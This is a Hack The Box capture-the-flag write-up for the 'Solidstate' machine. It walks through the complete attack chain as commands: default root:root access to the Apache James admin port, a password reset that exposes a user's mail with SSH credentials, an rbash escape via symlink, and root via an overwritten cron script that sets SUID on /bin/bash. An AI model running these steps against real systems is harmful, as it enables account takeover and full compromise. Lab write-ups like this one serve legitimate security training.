# Solidstate (HTB)

> Platform: Hack The Box  
> OS: Linux  
> Difficulty: Medium  
> Result: root

---

## Attack Chain

```text
Reconnaissance
├── nmap -sC -sV -A → 22 (SSH), 25 (SMTP), 80 (Apache 2.4.25), 110 (POP3), 119 (NNTP)
├── nmap -p- → 4555 (rsip / Apache James admin)
└── nc 10.129.1.53 4555 → root:root

Foothold (Apache James)
├── help → listusers → james, thomas, john, mindy, mailadmin
├── setpassword mindy writeup
├── telnet 10.129.1.53 110 → USER mindy / PASS writeup
├── LIST → RETR 2 → email from mailadmin
│   └── mindy:<PASSWORD> (SSH creds)
└── ssh mindy@10.129.1.53 → user.txt

Escaping rbash
├── cat /etc/passwd → mindy:/bin/rbash
├── ssh mindy@10.129.1.53 'ln -s /bin/bash /home/mindy/bin/bash'
└── ssh mindy@10.129.1.53 → bash -ip

Privilege Escalation
├── LinEnum.sh → /opt/tmp.py (world-writable, root-owned)
├── cat /opt/tmp.py → os.system('rm -r /tmp/*')
├── nano /opt/tmp.py → replace with os.system('chmod +s /bin/bash')
├── wait (cron) → ls -la /bin/bash → -rwsr-sr-x
└── /bin/bash -ip → root.txt
```

> [!NOTE]
> All flags, passwords, hashes, and session tokens have been masked for ethical reasons.

---

## Machine Briefing

Debian 9 (stretch), Apache James 2.3.2 (SMTP/POP3/NNTP). The root password in the James admin panel is default. Users: james, thomas, john, mindy, mailadmin.

---

## Reconnaissance

### Port Scan

```bash
sudo nmap -sC -sV -A -T5 -Pn 10.129.1.53
```

| Port | Service | Version                        |
|------|---------|--------------------------------|
| 22   | SSH     | OpenSSH 7.4p1 Debian 10+deb9u1 |
| 25   | SMTP    | (Apache James)                 |
| 80   | HTTP    | Apache httpd 2.4.25 (Debian)   |
| 110  | POP3    | (Apache James)                 |
| 119  | NNTP    | (Apache James)                 |

Full scan:

```bash
sudo nmap -p- -T4 10.129.1.53
```

Port 4555/tcp (rsip) is open - the Apache James admin interface.

---

## Foothold

### Apache James admin

```bash
nc 10.129.1.53 4555
```

**CVE-2015-7611** (NVD: https://nvd.nist.gov/vuln/detail/CVE-2015-7611)

Apache James 2.3.2 - unauthenticated password reset via the admin interface on port 4555 (default `root:root`).

Login `root:root`. Then:

```
help
listusers
```

```
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

### Resetting mindy's password

```
setpassword mindy writeup
```

### Reading mail via POP3

```bash
telnet 10.129.1.53 110
USER mindy
PASS writeup
LIST
RETR 2
```

Email from mailadmin:

```
username: mindy
pass: <PASSWORD>
```

### SSH

```bash
ssh mindy@10.129.1.53
# Password: <PASSWORD>
cat user.txt
# <USER_FLAG>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### Escaping rbash

```bash
cat /etc/passwd
# mindy:x:1001:1001:mindy:/home/mindy:/bin/rbash
```

Bypass via symlink:

```bash
ssh mindy@10.129.1.53 'ln -s /bin/bash /home/mindy/bin/bash'
ssh mindy@10.129.1.53
ls -la bin
bash -ip
```

---

## Privilege Escalation

### LinEnum

```bash
python3 -m http.server 80  # on Kali
cd /dev/shm
curl 10.10.16.15/LinEnum.sh -o LinEnum.sh
bash LinEnum.sh -t
```

Finding:

```
-rwxrwxrwx 1 root root 105 /opt/tmp.py
```

### Analyzing /opt/tmp.py

```bash
cat /opt/tmp.py
```

```python
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```

The script runs from cron as root but is world-writable.

### Replacing the contents

```bash
nano /opt/tmp.py
```

```python
#!/usr/bin/env python
import os
import sys
try:
     os.system('chmod +s /bin/bash')
except:
     sys.exit()
```

Wait for cron:

```bash
ls -la /bin/bash
# -rwsr-sr-x 1 root root 1265272 ... /bin/bash
```

### Root

```bash
/bin/bash -ip
whoami
# root
cat /root/root.txt
# <ROOT_FLAG>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Flags

| Flag | Value                            |
|------|----------------------------------|
| User | <USER_FLAG> |
| Root | <ROOT_FLAG> |

---

## Key Takeaways

- **Apache James admin on port 4555** - default `root:root` grants full control over the user list and allows resetting any user's password.
- **Passwords in email correspondence** - POP3 serves the message body with credentials in plaintext.
- **rbash bypassed via symlink** - if there is write access to `~/bin` (or any directory in `$PATH`), creating a symlink to `/bin/bash` removes the restriction.
- **World-writable scripts run by cron as root** - the most straightforward LPE vector: replace the contents, wait for execution, get a SUID binary.
